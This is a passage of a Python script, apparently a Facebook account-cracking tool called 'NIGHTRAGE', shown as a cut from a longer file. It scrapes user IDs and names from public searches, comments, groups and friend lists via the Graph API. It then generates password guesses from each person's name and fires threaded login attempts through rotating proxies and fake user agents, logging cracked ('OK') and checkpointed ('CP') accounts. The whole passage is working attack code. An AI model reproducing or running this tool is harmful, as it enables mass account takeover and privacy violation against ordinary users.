	nama = input(f'{U}[{H}•{U}] TARGET :{H} ')
	if ',' in str(nama):
		exit(f'{U}[{H}•{U}] ENTER SINGLE NAME ONLY')
	doma = input(f'{U}[{H}•{U}] DOMAIN :{hh} ')
	domino = random.choice(['@gmail.com','@yahoo.com','@hotmail.com','@proton.me','@protonmail.com','@outlook.com','@ymail.com','@hushmail.com','@temp-mail.org','@mail.ru','@live.com','@freemail.hu','@mail.com','@gmx.net'])
	if '@' not in str(doma) or '.com' not in str(doma):
		exit(f'{U}[{H}•{U}] ENTER THE CORRECT DOMAIN')
	jumlah = input(f'{U}[{H}•{U}] TOTAL  :{H} ')
	for xyz in range(int(jumlah)):
		A = nama
		B = [f'{str(rc(bas))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(bas))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(bas))}{str(rc(blk))}']
		C = domino
		D = f'{A}{str(rc(B))}{C}'
		if D in dump:pass
		else:dump.append(D+'|'+nama)
		if len(dump)==200000:atur_atur()
		print('\r DUMPING EMAILS %s id'%(len(dump)),end='')
		sys.stdout.flush()
	atur_atur()	

def crack_file():
	file = input(f'{U}[{H}•{U}] ENTER FILE PATH\n{U}[{H}•{U}] FILE PATH : {H}')
	try:
		uuid = open(file,'r').readlines()
		for data in uuid:
			try:user,nama = data.split('|')
			except:exit(f"{U}[{H}>{U}]{M} INCORRECT")
			dump.append(data)
			print(f'\r{U}[{H}•{U}] DUMPING IDS {hh}%s id'%(len(dump)),end=" ")
			sleep(0.0000003)
	except FileNotFoundError:exit(f"{H}[•] {M}FILE DOESN'T EXIST")
	print(f'\r{U}[{U}•{U}] THE TOTAL NUMBER OF ACCOUNTS IS {H}{len(dump)}')
	atur_atur()
	
def crack_search():
	nama = []
	custom = [" minaj"," rebecca"," gabriel"," amadi"," helen"," amos"," joel"," naomi"," agnes"," lucy"," becky"," laura"," wilson"," amanda"," joy"," grace"," splendor"," christiana"," sandra"," paul"," cecilia"," beatrice"," diana"," jade"," musa"," calista osinachi"," emmanuel okafor"," paul mmadu"," juliet onyeka"," jennifer ojo"," jimmy buhari"," nnaemeka"," uchechi okeke"," x jebe"," paul chidi"," nicki jones"," ganong"," situbondo"," aremania"," sunda"," garut"," cirebon"," sukabumi"," medan"," thejack"," bobotoh"," bonek"," suroboyo"," surabaya"," persebaya"," persib"," persija"," cilacap"," jepara"," solo"," official"," manis"," imut"," kalem"," utama"," sukses"," real"," semok"," kesepian"," rentcar"," makmur"," jaya"," jr"," tasik"," malang"," jogja"," mama"," ibuknya"," bundanya"," tiktok"," kece"," keren"," baru"," jutek"," saja"," putri"," andi"," dewi"," tri"," dian"," sri"," putri"," eka"," sari"," aditya"," basuki"," budi"," joni"," toni"," bekti"," cahya"," harahap"," riski"," farhan"," aden"," joko"," firman"," sulis"," soleh"," gagal"," kacau"," sulis"," rahmat"," indah"," pribadi"," saputro"," saputra"," kediri"," kudus"," jember"," situbondo"," pemalang"," wonosobo"," trenggalek","  tuban"," gresik"," bangkalan"," jombang"," kediri"," lamongan"," lumajang"," madiun"," magetan"," mojokerto"," nganjuk"," pacitan"," ngawi"," pasuruan"," ponorogo"," pamengkasan"," sidoarjo"," tuban"," blitar"," kediri"," banjarnegara"," batang"," blora"," brebes"," grobokan"," karanganyar"," kendal"," klaten"," kudus"," pati"," pekalongan"," rembang"," sragen"," tegal"," temanggung"," wonogiri"," wonosobo"," sukoharjo"," salatiga"," bandung"," samson"," chijioke"," chike"," tunde"," bola"," fashola"," ahmed"," adamu"," bisi"," daniella"," emmanuel"," john"," daniel"," damilola "]
	custom2 = ["mary ","josephine ","dua ","michelle ","gabriella ","magdalene ","putra ","moses ","gabriel ","jeremy ","walter ","moana ","johnbull ","joss ","johnny ","anita ","maryann ","kamsi ","mmesoma ","elizabeth ","ruth ","esther ","paulina ","july ","benita "]
	print(f'{U}[{H}•{U}] 1 NAME IS EQUIVALENT TO 10K ACCOUNTS')
	nam = input(f'{U}[{H}•{U}] NAME :{H} ').split(",")
	for ser in nam:		
		for belakang in custom:
			id = ser+belakang
			nama.append(id)
		for depan in custom2:
			id = depan+ser
			nama.append(id)
	with tred(max_workers=35) as thread:
		for id in nama:
			thread.submit(cari_nama,f"https://mbasic.facebook.com/public/{id}?/locale2=id_ID")
	atur_atur()
		
def cari_nama(link):
	r = parser(ses.get(str(link)).text,'html.parser')
	for x in r.find_all('td'):
		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
		for uid,nama in data:
			if 'profile.php?' in uid:
				uid = re.findall('id=(.*)',str(uid))[0]
			elif '<span' in nama:
				nama = re.findall('(.*?)\<',str(nama))[0]
			bo = uid+'|'+nama
			if bo in dump:pass
			else:dump.append(bo)
	try:
		link = r.find('a',string='View Next Results').get('href')
		if(link):
			print(f'\r{U}[{H}•{U}] {hh}Dumping ids.... %s id'%(len(dump)),end=" ")
			sys.stdout.flush()
			cari_nama(link)
	except:pass
	

def crack_komen():
	ide = input(f'{U}[{H}•{U}] ENTER TARGET POST ID\n{U}[{H}•{U}] POST ID :{H} ')
	url = 'https://mbasic.facebook.com/'+ide
	try:get_komen(url)
	except KeyboardInterrupt:atur_atur()
	if len(dump)==0:
		exit(f'{U}[{H}•{U}] {M}FAILED COMMENT DUMP')
	atur_atur()

def get_komen(url):
	data = parser(ses.get(url).text,"html.parser")
	for isi in data.find_all("h3"):
		for ids in isi.find_all("a",href=True):
			if "profile.php" in ids.get("href"):id = ids.get("href").split('=')[1].replace("&refid","")
			else:id = re.findall("/(.*?)?__",ids["href"])[0]. replace("?refid=52&","")
			nama = ids.text
			if id+"|"+nama in dump:pass
			else:dump.append(id+"|"+nama)
			print(f'\r{U}[{H}•{U}]{hh} Dumping {len(dump)} id ',end='');sys.stdout.flush()
	for z in data.find_all("a",href=True):
		if "Lihat komentar sebelumnya…" in z.text:
			try:get_komen("https://mbasic.facebook.com"+z["href"])
			except:pass
			
			
	
###---[ DUMP LOGIN ]---###
def crack_publik(t,c):
	akun = input(f'{U}[{hh}•{U}] MAKE SURE THE ACCOUNT IS PUBLIC \n{U}[{H}•{U}] ENTER ID :{H} ')
	try:
		bas = ses.get(f'https://graph.facebook.com/{akun}?fields=friends.fields(id,name).limit(5000)&access_token={open(".token.txt", "r").read()}',cookies=c).json()
		for pi in bas['friends']['data']:
			try:
				try:dump.append(pi['username']+'|'+pi['name'])
				except:dump.append(pi['id']+'|'+pi['name'])
				print('\rdumping IDs %s id'%(len(dump)),end=" ")
				sys.stdout.flush()
				time.sleep(0.0002)
			except:continue
		atur_atur()
	except (KeyError,IOError):
		exit(f"{U}[{M}•{U}] {M}this account is private")	


def crack_masal(t,c):
    print(f'{U}[{H}•{U}] MAKE SURE THE ACCOUNT IS PUBLIC ')
    try:
        bz=0
        apa = int(input(f'{U}[{H}•{U}] HOW MANY ID DO YOU WANT TO CRACK WITH: {H}'))
    except:apa=1
    for bz in range(apa):
    	bz +=1
    	akun = input(f'\r{U}[{H}•{U}] ID {bz} : {H}')
    	try:
    		bas = ses.get(f'https://graph.facebook.com/{akun}?fields=friends.fields(name,id).limit(5000)&access_token={open(".token.txt", "r").read()}',cookies=c).json()
    		for pi in bas['friends']['data']:
    		      try:dump.append(pi['username']+'|'+pi['name'])
    		      except:dump.append(pi['id']+'|'+pi['name'])
    		      print(f'\r{U}[{H}•{U}] {H}Dumping IDs %s id'%(len(dump)),end=" ")
    		      sys.stdout.flush()
    		      time.sleep(0.0002)
    	except:
    		print(f"\r{U}[{H}!{U}] {M}This account is private{U}      ")
    		continue	                       		
    atur_atur()
    
    
def crack_foll(t,c):
	akun = input(f'{U}[{H}•{U}] MAKE SURE THE ACCOUNT IS PUBLIC \n{U}[{H}•{U}] ACCOUNT :{H} ')
	try:
		bas = ses.get(f'https://graph.facebook.com/{akun}?fields=friends.fields(name,id).limit(1000000000)&access_token={open(".token.txt", "r").read()}',cookies=c).json()
		for pi in bas["subscribers"]["data"]:
			try:
				try:dump.append(pi['username']+'|'+pi['name'])
				except:dump.append(pi['id']+'|'+pi['name'])
				print(f'\r{hh} Dumping %s id'%(len(dump)),end=" ")
				sys.stdout.flush()
				time.sleep(0.0002)
			except:continue
		atur_atur()
	except (KeyError,IOError):
		exit(f"{U}[{H}•{U}] {M} ACOUNT IS NOT PUBLIC")
		
def crack_group():
	link = input(f'{U}[{H}•{U}] MAKE SURE THE GROUP IS PUBLIC \n{U}[{H}•{U}] GROUP ID :{H} ')
	url = "https://mbasic.facebook.com/groups/"+link
	try:dump_grup(url)
	except KeyboardInterrupt:atur_atur()
	if len(dump)==0:
		exit(f'{U}[{H}•{U}]{M} FAILED TO DUMP GROUP')
	atur_atur()

def dump_grup(url):
	try:
		data = parser(ses.get(url, headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1; A1601 Build LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/E7FBAF"}).text, "html.parser")
		for x in data.find_all("table"):
			par = x.text
			if ">" in par.split(" ") or "mengajukan" in par.split(" "):
				id = re.findall("content_owner_id_new.\w+",str(x))[0].replace("content_owner_id_new.","")
				if " mengajukan pertanyaan ." in par:nama = par.replace(" mengajukan pertanyaan .","")
				else:nama = par.split(" > ")[0]
				if id+"|"+nama in dump:pass
				else:dump.append(id+"|"+nama)
				print(f'\r sedang dump {len(dump)} id ',end='');sys.stdout.flush()
		for z in data.find_all("a"):
			if "Lihat Postingan Lainnya</span" in str(z).split(">"):
				href = str(z).replace('<a href="','').replace("amp;","").split(" ")[0].replace('"><span>Lihat','')
				dump_grup("https://mbasic.facebook.com"+href)
	except:dump_grup(url)
		
		
###---[ ATUR SEBELUM CRACK ]---###
akunok = []
def atur_atur():
	print(f"\r{hh}───────────────────────────────────────────────")
	ro = input(f'{U}[{hh}1{U}] MOBILE FACEBOOK\n[{hh}2{U}] MBASIC FACEBOOK :{H} ')
	if ro in ['1','01']:metode.append('mobile')
	elif ro in ['2','02']:metode.append('mbasic')
	else:metode.append('mobile')
	print(f"{hh}───────────────────────────────────────────────")
	ch = input(f'{U}[{H}TYPE {H}R/r{U}] old / new / random:{H} ')
	if ch in ['o','O']:
		for x in dump:
			id.append(x)
	elif ch in ['n','N']:
		for x in dump:
			id.insert(0,x)
	elif ch in ['r','R']:
		for x in dump:
			xx = random.randint(0,len(id))
			id.insert(xx,x)
	else:
		for x in dump:
			id.append(x)
	print(f"{hh}───────────────────────────────────────────────")
	cp = input(f'{U}[{H}!{U}] VIEW OPTION CHECKPOINT : {H}NO ')
	if cp in ['y','Y','ya','Ya','1','01','yy','YA','yA']:
		cepeh.append('ya')
	print(f"{hh}───────────────────────────────────────────────")
	apk = input(f'{U}[{hh}!{U}] VIEW APPLICATION :{H} NO ')
	if apk in ['y','Ya','ya','1']:akunok.append('apk')
	else:akunok.append('coki')
	print(f"{hh}───────────────────────────────────────────────")
	ch = input(f'{U}[{hh}1{U}] MANUAL PASSWORD\n{U}[{hh}2{U}] COMBINED PASSWORD\n{U}[{hh}3{U}] DEFAULT PASSWORD\n{U}[{H}•{U}] CHOOSE : {H}')
	if ch in ['1','01']:manual()
	elif ch in ['2','02']:gabung() 
	print(f"{hh}───────────────────────────────────────────────")
	print(f"{U}[{H}01{U}] METHOD 1 ({H}HI-SPEED{U})") 
	print(f"{U}[{H}02{U}] METHOD 2 ({H}NORMAL SPEED{U})") 
	print(f"{U}[{H}03{U}] METHOD 3 ({H}SLOW & BEST{U})")
	print(f"{U}[{H}04{U}] METHOD 4 ({H}FASTEST{U})")
	if ch in ['3','03']:ask = input(f'{U}[{hh}••{U}] CHOOSE :{hh} ') 
	if ask in ['1','01']:fast_crack() 
	elif ask in ['2','02']:medium_crack() 
	elif ask in ['3','03']:otomatis()
	elif ask in ['4','04']:jet_speed()
	
from datetime import datetime    
####---[NIGHT METHOD]---####
def jet_speed():
	global ok,cp
	print(f"{hh}───────────────────────────────────────────────")
	print(f'{U}[{H}•{U}]{H} OK STORED IN : {sim_ok}\n{U}[{H}•{U}]{K} CP STORED IN : {sim_cp}')
	print(f"{hh}───────────────────────────────────────────────") 
	os.popen('play-audio .halo.mp3')
	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pwx = []
			if len(nama)<=5:
				if len(depan)<=1 or len(depan)<=2:
					pass 
				else:
					pwx.append(nama)
			else:
				if len(depan)<=1 or len(depan)<=2:
					try:
						tengah = nama.split(" ")[1]
						if len(tengah)<=3:
							pass
						else:
							pwx.append(nama)
					except:
						try:
							belakang = nama.split(' ')[2]
							if len(belakang)<=3:pass
							else:
								pwx.append(nama)
						except:pwx.append(nama)
				else:
					pwx.append(nama)
			if 'mobile' in metode:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic' in metode:
				babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				babas.submit(crack,idf,pwx,"free.facebook.com",awal)
			else:
				babas.submit(crack,idf,pwx,"free.facebook.com",awal)
	sleep(5)
	print(f'\r{U}[{hh}•{U}]{H} TOTAL OK: {ok}\n{U}[{hh}•{U}]{Kk} TOTAL CP: {cp} ')
	
def fast_crack():
	global ok,cp
	print(f"{hh}───────────────────────────────────────────────")
	print(f'{U}[{H}•{U}]{H} OK STORED IN : {sim_ok}\n{U}[{H}•{U}]{K} CP STORED IN : {sim_cp}')
	print(f"{hh}───────────────────────────────────────────────") 
	os.popen('play-audio .halo.mp3')
	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pwx = []
			if len(nama)<=5:
				if len(depan)<=1 or len(depan)<=2:
					pass 
				else:
					pwx.append(depan+"123") 
					pwx.append(depan+"1234") 
					pwx.append(depan+"12345")
					pwx.append(depan+"123456") 
					pwx.append("123556") 
			else:
				if len(depan)<=1 or len(depan)<=2:
					try:
						tengah = nama.split(" ")[1]
						if len(tengah)<=3:
							pass
						else:
							pwx.append(tengah+"123") 
							pwx.append(tengah+"1234") 
							pwx.append(tengah+"12345") 
							pwx.append("123556") 
							pwx.append(tengah+"123456")
							pwx.append(nama)
					except:
						try:
							belakang = nama.split(' ')[2]
							if len(belakang)<=3:pass
							else:
								pwx.append(belakang+"123") 
								pwx.append("123556") 
								pwx.append(belakang+"1234")
								pwx.append(belakang+"12345") 
								pwx.append(belakang+"123456")
								pwx.append(nama)
						except:pwx.append(nama)
				else:
					pwx.append(nama)
					pwx.append(depan+"123") 
					pwx.append(depan+"1234") 
					pwx.append(depan+"12345")
					pwx.append("123556") 
					pwx.append(depan+"123456") 
			if 'mobile' in metode:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic' in metode:
				babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				babas.submit(crack,idf,pwx,"free.facebook.com",awal)
			else:
				babas.submit(crack,idf,pwx,"free.facebook.com",awal)
	sleep(5)
	print(f'\r{U}[{hh}•{U}]{H} TOTAL OK: {ok}\n{U}[{hh}•{U}]{Kk} TOTAL CP: {cp} ')
	
def medium_crack():
	global ok,cp
	print(f"{hh}───────────────────────────────────────────────")
	print(f'{U}[{H}•{U}]{H} OK STORED IN : {sim_ok}\n{U}[{H}•{U}]{K} CP STORED IN : {sim_cp}')
	print(f"{hh}───────────────────────────────────────────────") 
	os.popen('play-audio .halo.mp3')
	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pwx = []
			if len(nama)<=5:
				if len(depan)<=1 or len(depan)<=2:
					pass 
				else:
					pwx.append(depan+"1") 
					pwx.append(depan+"12") 
					pwx.append(depan+"123456") 
					pwx.append(depan+"123") 
					pwx.append(depan+"@")
					pwx.append(depan+"@@@")
					pwx.append(depan+"@@")
					pwx.append(depan+"1234")
					pwx.append("123556") 
					pwx.append(depan+"12345")
					pwx.append(depan+"@123")
			else:
				if len(depan)<=1 or len(depan)<=2:
					try:
						tengah = nama.split(" ")[1]
						if len(tengah)<=3:
							pass
						else:
							pwx.append(tengah+"1") 
							pwx.append(tengah+"12") 
							pwx.append(tengah+"123") 
							pwx.append(tengah+"@@@")
							pwx.append(tengah+"@") 
							pwx.append(tengah+"@@")
							pwx.append("123556") 
							pwx.append(tengah+"1234") 
							pwx.append(tengah+"@123")
							pwx.append(tengah+"12345") 
							pwx.append(tengah+"123456")
							pwx.append(nama)
					except:
						try:
							belakang = nama.split(' ')[2]
							if len(belakang)<=3:pass
							else:
								pwx.append(belakang+"1") 
								pwx.append(belakang+"12") 
								pwx.append("123556") 
								pwx.append(belakang+"123") 
								pwx.append(belakang+"@")
								pwx.append(belakang+"@@")
								pwx.append(belakang+"@@@")
								pwx.append(belakang+"@123")
								pwx.append(belakang+"1234")
								pwx.append(belakang+"12345") 
								pwx.append(belakang+"123456")
								pwx.append(nama)
						except:pwx.append(nama)
				else:
					pwx.append(nama)
					pwx.append(depan+"1") 
					pwx.append(depan+"12") 
					pwx.append(depan+"123456") 
					pwx.append(depan+"123") 
					pwx.append(depan+"@")
					pwx.append("123556") 
					pwx.append(depan+"@@@")
					pwx.append(depan+"@@")
					pwx.append(depan+"1234")
					pwx.append(depan+"12345")
					pwx.append(depan+"@123")
			if 'mobile' in metode:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic' in metode:
				babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				babas.submit(crack,idf,pwx,"free.facebook.com",awal)
			else:
				babas.submit(crack,idf,pwx,"free.facebook.com",awal)
	sleep(5)
	print(f'\r{U}[{hh}•{U}]{H} TOTAL OK: {ok}\n{U}[{hh}•{U}]{Kk} TOTAL CP: {cp} ') 
	

###---[ ATUR SANDI ]---###
def manual():
	global ok,cp
	pwx = []
	print(f"{hh}───────────────────────────────────────────────")
	B = input(f'{U}[{hh}•{U}] input 6 word manual password \n passwor[•]   : ').split(',')
	for x in B:
		pwx.append(x)
	print(f"{hh}───────────────────────────────────────────────")
	print(f'{U}[{H}•{U}]{H} OK RESULT STORED IN : {sim_ok}\n{U}[{H}•{U}]{kk}CP RESULT STORED IN : {sim_cp}{hh}')
	print(f"{hh}───────────────────────────────────────────────")
	os.popen('play-audio shad2.mp3')
	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			if 'mobile' in metode:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic' in metode:
				babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				babas.submit(crack,idf,pwx,"free.facebook.com",awal)
			else:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	print(f'\r{U} [{hh}•{U}]{U}crack has been completed,\n{U}[{H}•{U}]{H} number of OKs :{ok}\n{U}[{H}•{U}]{kk} number of CPs :{cp}{U} ')


def gabung():
	global ok,cp
	pwx = []
	A = ["123456"]
	print(f"{h}───────────────────────────────────────────────")
	B = input(f'{U}[{hh}•{U}] 6 words manual password input\n[•] Password  : ').split(',')
	C = input(f'{U}[{hh}•{U}] input last name password\n[•] Password  : ')
	if ',' in str(C):
		exit(f"{U}[{H}•{U}] one-word back password only")
	print(f"{H}───────────────────────────────────────────────")
	print(f'{U}[{H}•{U}] {H}OK RESULT STORED IN : {sim_ok}\n{U}[{H}•{U}] {kk}CP RESULT STORED IN : {sim_cp}')
	print(f"{H}───────────────────────────────────────────────") 
	os.popen('play-audio .halo.mp3')
	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pwx = A+B
			if len(nama)<=5:
				if len(depan)<=1 or len(depan)<=2:
					pass 
				else:
					pwx.append(depan+"1") 
					pwx.append(depan+"12") 
					pwx.append(depan+"123456") 
					pwx.append(depan+"123") 
					pwx.append(depan+"@")
					pwx.append(depan+"@@@")
					pwx.append(depan+"@@") 
					pwx.append(depan+"baby")
					pwx.append(depan+"456") 
					pwx.append(depan+"2020")
					pwx.append(depan+"2021")
					pwx.append(depan+"2022")
					pwx.append(depan+"789") 
					pwx.append(depan+"?")
					pwx.append("123556") 
					pwx.append(depan+"1234")
					pwx.append(depan+"12345")
					pwx.append(depan+"@123")
					pwx.append(depan+"456")
					pwx.append(depan+C)
			else:
				if len(depan)<=1 or len(depan)<=2:
					try:
						tengah = nama.split(" ")[1]
						if len(tengah)<=3:
							pass
						else:
							pwx.append(tengah+"1") 
							pwx.append(tengah+"12") 
							pwx.append(tengah+"123") 
							pwx.append(tengah+"@@@")
							pwx.append(tengah+"@") 
							pwx.append(tengah+"2020")
							pwx.append(tengah+"2021") 
							pwx.append(tengah+"baby")        
							pwx.append(tengah+"456")
							pwx.append(tengah+"789")
							pwx.append(tengah+"?")
							pwx.append(tengah+"2022")
							pwx.append(tengah+"@@")
							pwx.append("123556") 
							pwx.append(tengah+"1234") 
							pwx.append(tengah+"@123")
							pwx.append(tengah+"12345") 
							pwx.append(tengah+"123456")
							pwx.append(tengah+C)
							pwx.append(nama)
					except:
						pwx.append(nama)
				else:
					pwx.append(nama)
					pwx.append(depan+"1") 
					pwx.append(depan+"12") 
					pwx.append(depan+"123456") 
					pwx.append(depan+"123") 
					pwx.append(depan+"@")
					pwx.append(depan+"@@@")
					pwx.append(depan+"@@") 
					pwx.append(depan+"baby")
					pwx.append(depan+"456") 
					pwx.append(depan+"2020")
					pwx.append(depan+"2021")
					pwx.append(depan+"2022")
					pwx.append("123556") 
					pwx.append(depan+"789") 
					pwx.append(depan+"?")
					pwx.append(depan+"1234")
					pwx.append(depan+"12345")
					pwx.append(depan+"@123")
					pwx.append(depan+"456")
					pwx.append(depan+C)
			if 'mobile' in metode:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic' in metode:
				babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				babas.submit(crack,idf,pwx,"free.facebook.com",awal)
			else:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	print(f'\r{U}[{hh}•{U}] crack has been completed\n{U}[{H}•{U}]{H} TOTAL OK:{ok}\n{U}[{H}•{U}] {kk}TOTAL CP:{cp} ')
				

def otomatis():
	global ok,cp
	print(f"{hh}───────────────────────────────────────────────")
	print(f'{U}[{H}•{U}]{H} OK STORED IN : {sim_ok}\n{U}[{H}•{U}]{K} CP STORED IN : {sim_cp}')
	print(f"{hh}───────────────────────────────────────────────") 
	os.popen('play-audio .halo.mp3')
	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pwx = []
			if len(nama)<=5:
				if len(depan)<=1 or len(depan)<=2:
					pass 
				else:
					pwx.append(depan+"1")
					pwx.append(depan+" "+depan)
					pwx.append(depan)
					pwx.append(depan+"12")
					pwx.append(depan+"123")
					pwx.append(depan+"1234")
					pwx.append(depan+"12345")
					pwx.append(depan+"123456")
					pwx.append(depan+"2015")
					pwx.append(depan+"2016")
					pwx.append(depan+"2017")
					pwx.append(depan+"2018")
					pwx.append(depan+"2019")
					pwx.append(depan+"2020")
					pwx.append(depan+"2021")
					pwx.append(depan+"2022")
					pwx.append(depan+"456")
					pwx.append(depan+"@")
					pwx.append(depan+"@@")
					pwx.append(depan+"@@@")
					pwx.append("password")
					pwx.append("password1")
					pwx.append("password12")
					pwx.append("password123")
					pwx.append("password1234")
					pwx.append("1234567")
					pwx.append("12345678")
					pwx.append("123456789")
					pwx.append(depan+"baby")
			else:
				if len(depan)<=1 or len(depan)<=2:
					try:
						tengah = nama.split(" ")[1]
						if len(tengah)<=3:
							pass
						else:
							pwx.append(tengah+"1")
							pwx.append(tengah+" "+tengah)
							pwx.append(tengah)
							pwx.append(tengah+"2")
							pwx.append(tengah+"12")
							pwx.append(tengah+"123")
							pwx.append(tengah+"1234")
							pwx.append(tengah+"12345")
							pwx.append(tengah+"123456")
							pwx.append(tengah+"2015")
							pwx.append(tengah+"2016")
							pwx.append(tengah+"2017")
							pwx.append(tengah+"2018")
							pwx.append(tengah+"2019")
							pwx.append(tengah+"2020")
							pwx.append(tengah+"2021")
							pwx.append(tengah+"2022")
							pwx.append(tengah+"456")
							pwx.append(tengah+"@")
							pwx.append(tengah+"@@")
							pwx.append(tengah+"@@@")
							pwx.append("password")
							pwx.append("password1")
							pwx.append("password12")
							pwx.append("password123")
							pwx.append("password1234")
							pwx.append("password12345")
							pwx.append("1234567")
							pwx.append("12345678")
							pwx.append("123456789")
							pwx.append(tengah+"baby")
							pwx.append(nama)
					except:
						try:
							belakang = nama.split(' ')[2]
							if len(belakang)<=3:pass
							else:
								pwx.append(belakang+"1")
								pwx.append(belakang+" "+belakang)
								pwx.append(belakang)
								pwx.append(belakang+"2")
								pwx.append(belakang+"12")
								pwx.append(belakang+"123")
								pwx.append(belakang+"1234")
								pwx.append(belakang+"12345")
								pwx.append(belakang+"123456")
								pwx.append(belakang+"2015")
								pwx.append(belakang+"2016")
								pwx.append(belakang+"2017")
								pwx.append(belakang+"2018")
								pwx.append(belakang+"2019")
								pwx.append(belakang+"2020")
								pwx.append(belakang+"2021")
								pwx.append(belakang+"2022")
								pwx.append(bekalang+"456")
								pwx.append(belakang+"@")
								pwx.append(belakang+"@@")
								pwx.append(belakang+"@@@")
								pwx.append(belakang+"@1")
								pwx.append(belakang+"@12")
								pwx.append(belakang+"@123")
								pwx.append(belakang+"@1234")
								pwx.append(belakang+"@12345")
								pwx.append(belakang+"@123456")
								pwx.append("password")
								pwx.append("password1")
								pwx.append("password12")
								pwx.append("password123")
								pwx.append("password1234")
								pwx.append("password12345")
								pwx.append("1234567")
								pwx.append("12345678")
								pwx.append("123456789")
								pwx.append(nama)
						except:pwx.append(nama)
				else:
					pwx.append(nama)
					pwx.append(depan+"1")
					pwx.append(depan+" "+depan)
					pwx.append(depan)
					pwx.append(depan+"12")
					pwx.append(depan+"123")
					pwx.append(depan+"1234")
					pwx.append(depan+"12345")
					pwx.append(depan+"123456")
					pwx.append(depan+"2015")
					pwx.append(depan+"2016")
					pwx.append(depan+"2017")
					pwx.append(depan+"2018")
					pwx.append(depan+"2019")
					pwx.append(depan+"2020")
					pwx.append(depan+"2021")
					pwx.append(depan+"2022")
					pwx.append(depan+"456")
					pwx.append(depan+"@")
					pwx.append(depan+"@@")
					pwx.append(depan+"@@@")
					pwx.append("password")
					pwx.append("password1")
					pwx.append("password12")
					pwx.append("password123")
					pwx.append("password1234")
					pwx.append("1234567")
					pwx.append("12345678")
					pwx.append("123456789")
					pwx.append(depan+"baby")
			if 'mobile' in metode:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic' in metode:
				babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				babas.submit(crack,idf,pwx,"free.facebook.com",awal)
			else:
				babas.submit(crack,idf,pwx,"free.facebook.com",awal)
	sleep(5)
	print(f'\r{U}[{hh}•{U}]{H} TOTAL OK: {ok}\n{U}[{hh}•{U}]{Kk} TOTAL CP: {cp} ')
	#os.popen('play-audio data/selesai.mp3')
				
###---FAKE USER AGENT 😂😂]---###
f_ua = random.choice(fake)
###---[ MENU CRACK ]---###
resok = []
rescp = [] 
def crack(idf,pwx,url,awal):
	global loop,ok,cp
	ses = requests.Session()
	bo = random.choice([H,G,K,B,Z,bb,Z,O,P,M,U])
	xx = open('.proxy.txt','r').read().splitlines()
	ua2 = random.choice(ugen2)
	ua = random.choice(ugen)
	ahir = str(datetime.now()-awal).split('.')[0] 
	print(f"\r{P}[{bo}NIGHTRAGE{P}]-[{bb}{ahir}{P}]-[{G}%s{P}/{G}%s{P}]-[{hh}OK{P}:{hh}%s{P}]-[{kk}CP{P}:{kk}%s{P}]"%(loop,len(id),ok,cp),end=" ");sys.stdout.flush()
	for pw in pwx:
		try:
			proxy = {'http': 'socks4://'+random.choice(xx)}
			ses.headers.update({"Host": url, "upgrade-insecure-requests": "1", "user-agent": ua, "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site":  "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language":  "en-US;q=0.8,en;q=0.7"})
